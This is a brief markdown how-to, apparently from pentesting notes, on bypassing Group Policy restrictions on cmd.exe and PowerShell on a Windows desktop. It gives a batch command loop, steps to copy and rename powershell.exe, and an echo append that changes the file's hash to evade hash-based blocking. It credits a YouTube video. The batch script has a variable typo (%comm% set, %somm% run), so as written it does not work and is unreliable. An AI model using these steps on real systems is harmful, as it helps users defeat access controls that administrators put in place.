# Bypass cmd and ps1 Restriction on Windows Desktop  

>Windows bypass CMD & PowerShell Restriction  

>The follow content saved to a file named `bypasscmd.bat` on the desktop of user on windows computer.  

```DOS
@echo off
:a
Set /p comm=cmd~
%somm%
Goto a
```  

>The following copy methods can be used to bypass if `powershell.exe` restrictions are enforced with Group Policy.  

```
copy c:\windows\System32\WindowsPowerShell\v1.0\powershell.exe c:\users\peanut\desktop\powershell.exe
```  

If above copy do not bypass restrictions, then rename the file to new name before running.  

```
copy c:\windows\System32\WindowsPowerShell\v1.0\powershell.exe c:\users\peanut\desktop\NEW_powershell.exe
```  

If the hash of the restricted file is checked then alter the hash of the `PowerShell.exe' using below method.

```
echo >>C:\users\peanut\desktop\powershell.exe
```  

The techniques to perform Windows Bypass of restricted applications is explained in the video by [Loi Liang Yang](https://youtu.be/H6dgqTpAtkk).  
